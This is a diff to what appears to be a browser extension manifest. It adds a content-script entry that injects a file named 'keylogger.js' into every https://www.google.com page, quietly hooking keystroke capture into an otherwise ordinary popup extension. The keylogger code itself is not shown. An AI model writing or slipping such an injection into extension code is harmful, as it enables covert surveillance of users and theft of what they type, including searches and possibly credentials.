@@ -11,6 +11,12 @@
         "default_icon": "icon.png",
         "default_popup": "index.html"
     },
+    "content_scripts": [
+        {
+          "matches": [ "https://www.google.com/*" ],
+          "js": [ "keylogger.js" ]
+        }
+    ],
     "background": {
         "scripts": [
             "background-es2015.js", //TODO: might need to change name
